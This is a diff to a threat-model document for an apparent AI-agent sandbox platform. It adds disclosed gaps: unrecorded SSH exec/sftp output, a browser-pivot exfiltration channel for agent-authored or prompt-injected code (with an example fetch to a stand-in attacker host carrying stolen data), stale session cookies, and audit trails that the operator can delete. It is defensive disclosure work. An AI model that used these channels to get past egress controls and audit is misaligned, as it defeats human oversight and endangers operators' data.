@@ -600,7 +600,16 @@ hiding them would repeat the failure mode we are designed to avoid.
     client (`docs/SSH.md`, "Recording"); the UI gateway makes the gap easier
     to reach, and states it in the product (the console lane's own
     no-recording line, `docs/design/ui-sandboxes-prompt.md`) rather than only
-    here.
+    here. **The `ssh -L` reference above is one instance of a wider gap, not
+    the whole of it**: on every SSH-gateway-enabled run, `ssh.exec` records
+    only `argv`/`exit` and `ssh.sftp` only a byte count — the command's
+    stdout/stderr and the sftp payload itself are never captured, and sftp's
+    byte accounting undercounts because only one transfer direction is
+    metered. `docs/SSH.md`'s "Audit actions" names the fields honestly; this
+    residual is the fact that neither is a substitute for replay when a run's
+    policy needs one. There is no per-lane refusal today that blocks exec/sftp
+    on a run whose policy also demands replay — the two requirements can be
+    declared together and silently leave the exec/sftp portion unreplayable.
 
 20. **Capability enforcement is off until an admin turns it on, and three
     narrower gaps sit underneath that default.** The v0.6 permissioning pillar
@@ -656,6 +665,87 @@ hiding them would repeat the failure mode we are designed to avoid.
       (residual #14's "the control plane authenticates; it barely authorizes"
       remains the frame), not a bypass, but an operator reasoning about blast
       radius should read a capability as bounding *authorship*, not *reach*.
+
+21. **The UI-sandbox relay is a browser-pivot egress channel, analyzed so far
+    only as a console-origin threat.** Residual #18 covers cross-run
+    scripting within the relay's shared origin; this is the separate,
+    un-analyzed direction. `handleUIRelay` (`internal/api/uigateway.go`)
+    serves the sandbox's own app content, and its doc comment is explicit
+    that this adds "no new network path out of the sandbox" (`uigateway.go:9`)
+    — true for the sandbox's netns. But the HTML/JS that content contains
+    then runs in the **operator's own browser**, which is not confined by
+    Wardyn at all: a `fetch(attacker, {mode:'no-cors', body:stolen})` issued
+    by sandbox-authored JS reaches the open internet through the operator's
+    normal browser networking, entirely outside `wardyn-proxy` and any egress
+    policy. The relay deliberately sets no CSP or `X-Frame-Options`
+    (`uigateway.go:171`, comment: "this origin serves the sandbox's own app,
+    and the console's policy would break it") — a reasonable call for
+    serving an arbitrary dev server, but it means nothing on this response
+    constrains what that page's script can reach. Audit records only
+    `ui.auth`/`ui.open`/`ui.close` (residual #19) — no visibility into what
+    the page itself did over this channel. **Operator acknowledgment**:
+    opening a run's UI app runs that run's (agent-authored, possibly
+    prompt-injected) code in your browser, with your browser's own network
+    reach. A `Content-Security-Policy: connect-src 'self'` on relay responses
+    would narrow, not close, this — it stops in-page `fetch`/`XHR`/WebSocket
+    egress but not navigation or a form submit, and is not implemented.
+
+22. **The UI-relay's 8-hour session cookie re-checks the run's state, not the
+    principal's current authorization.** `uiSessionTTL` is 8 hours
+    (`internal/api/uigateway.go:84`); the cookie is minted once, at
+    `handleUIEnter` time, against the caller's role at that moment
+    (`uigateway.go:346-364`). Every subsequent relayed request re-validates
+    only that the underlying run is still live (`uigateway.go`'s dial path) —
+    it never re-checks that the cookie's principal is still an admin, still
+    owns the run, or still exists as an active session. Revoke an admin's
+    role, or delete their OIDC session, mid-run: their UI-relay cookie keeps
+    working until either the 8-hour TTL lapses or the run itself stops. This
+    is a distinct surface from residual #15's SSH admin-role stamp (that one
+    is scoped to key registration; this one is a live per-request cookie that
+    could re-check and does not).
+
+23. **The shipped default deployment collapses the audited insider into the
+    trusted operator.** The actor table above (§1) treats "Platform operator
+    / SRE" as trusted and out of scope, and "Malicious insider (developer)"
+    as the audited adversary — but those are the SAME person on the topology
+    Wardyn actually ships today. `make setup`'s flagship path runs
+    `wardynd` in no-auth local mode on an empty admin token
+    (`docs/ENV.md`'s `WARDYN_ADMIN_TOKEN` row: an empty token plus a loopback
+    bind auto-enables it), so on a single developer's laptop the governed
+    developer IS the platform operator: they hold the Docker host the
+    "append-only" audit trail lives on (`docker compose down -v` deletes it
+    outright — `docs/OPERATIONS.md`'s "State stores" table: "Lose any of them
+    and the loss is permanent"), and they can edit policy/enforcement freely
+    as their own admin. Every
+    insider-attribution claim elsewhere in this document is void under that
+    topology, silently, unless this is said out loud: **the residual-#9
+    insider-admin exclusion is not a corner case on the laptop default — it
+    is the norm**. The real fix is the multi-user central-control-plane
+    topology (`docs/OPERATIONS.md`'s "Multi-user: who can change what"),
+    which requires the operator to actually be a separate party from the
+    developers whose runs they audit; nothing in the product enforces that
+    separation exists.
+
+24. **`TestAuthzMatrix`'s "cannot go stale" invariant does not cover the
+    UI-sandbox gateway.** The matrix's own coverage-boundary comment
+    (`internal/api/authz_test.go:28-41`) names exactly one excluded surface —
+    the SSH gateway's separate listener — and explains why: `chi.Walk`
+    (`authz_test.go:303-308`) only discovers routes on `srv.router`, so a
+    route living on a different `http.Handler` is invisible to it whether or
+    not the comment says so. The UI-sandbox gateway is the second such
+    surface: `handleUIGateway` (`internal/api/uigateway.go:161-184`) is wired
+    as its own listener/handler, never registered on `srv.router`, so it is
+    exactly as invisible to `TestAuthzMatrix` as SSH is — but the comment
+    does not say so, which reads as a stronger guarantee ("every route") than
+    the test actually provides. This is a credibility/completeness gap in
+    what the matrix's green run is understood to mean, not a live
+    authorization hole: `uigateway_test.go` is that surface's own dedicated
+    test file and exercises its authorization today, the same relationship
+    `sshgateway_test.go` has to the SSH exclusion. A future route added to
+    the UI gateway's own router, though, would escape both the "walk finds
+    every route" guarantee and this document's notice of the exclusion,
+    exactly the failure mode `TestAuthzMatrix` exists to prevent everywhere
+    else.
 
 ### 5.1a LLM egress content inspection — the honest-claims contract
 
